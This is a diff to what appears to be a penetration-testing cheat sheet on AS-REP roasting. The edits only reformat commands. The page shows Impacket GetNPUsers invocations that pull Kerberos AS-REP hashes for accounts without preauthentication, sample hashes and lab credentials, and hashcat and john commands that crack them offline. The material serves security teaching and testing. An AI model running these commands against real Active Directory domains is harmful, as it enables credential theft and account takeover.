@@ -49,13 +49,13 @@
 ### [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from Impacket Suite
 
   ```bash
-  $ python GetNPUsers.py htb.local/svc-alfresco -no-pass
+  $ Impacket-GetNPUsers htb.local/svc-alfresco -no-pass
   [*] Getting TGT for svc-alfresco
   $krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4
 
   # extract hashes
-  root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
-  root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
+  Impacket-GetNPUsers jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+  Impacket-GetNPUsers jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
   ```
 
 ### netexec Module
@@ -65,7 +65,7 @@
   LDAP        10.0.2.11       389    dc01           $krb5asrep$23$john.doe@LAB.LOCAL:5d1f750[...]2a6270d7$096fc87726c64e545acd4687faf780[...]13ea567d5
   ```
 
-## Using `hashcat` or `john` to crack the ticket.
+## Using hashcat or john to crack the ticket.
 
 ```bash
 # Linux
@@ -74,7 +74,7 @@ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt
 
 # crack AS_REP messages with john (Windows)
-C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
+john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
 ```
 
 **Mitigations**:
